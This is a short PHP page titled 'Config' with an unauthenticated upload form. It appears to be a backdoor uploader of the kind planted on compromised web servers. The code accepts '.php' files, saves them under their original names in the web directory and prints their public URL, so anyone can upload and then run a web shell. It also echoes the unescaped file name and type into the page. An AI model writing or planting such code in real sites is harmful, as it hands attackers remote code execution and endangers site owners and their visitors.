<title>Config</title>
<?php
$max = 2000000; $w = 900; $h = 800; $ok = ['txt','php','jpg','jpe','7z'];
if ($_FILES['fileup']['name']) {
  $f = $_FILES['fileup']; $ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
  list($fw, $fh) = @getimagesize($f['tmp_name']) ?: [0, 0];
  $e = (!in_array($ext,$ok) ? "Bad type. " : '') .
       ($f['size'] > $max ? "Too big. " : '') .
       ($fw >= $w || $fh >= $h ? "Too wide/tall. " : '');
  if (!$e && move_uploaded_file($f['tmp_name'], $f['name']))
    echo "Uploaded <b>$f[name]</b><br>Type: $f[type]<br>Size: ".round($f['size']/1024,1)."KB" .
         ($fw ? "<br>Size: {$fw}x{$fh}" : '') .
         "<br>URL: http://$_SERVER[HTTP_HOST]".dirname($_SERVER['REQUEST_URI'])."/$f[name]";
  else echo $e ?: "Upload failed.";
}
?>
<form method="POST" enctype="multipart/form-data" style="text-align:center;margin:1em;">
  <input type="file" name="fileup"><br>
  <input type="submit" value="Upload">
</form>
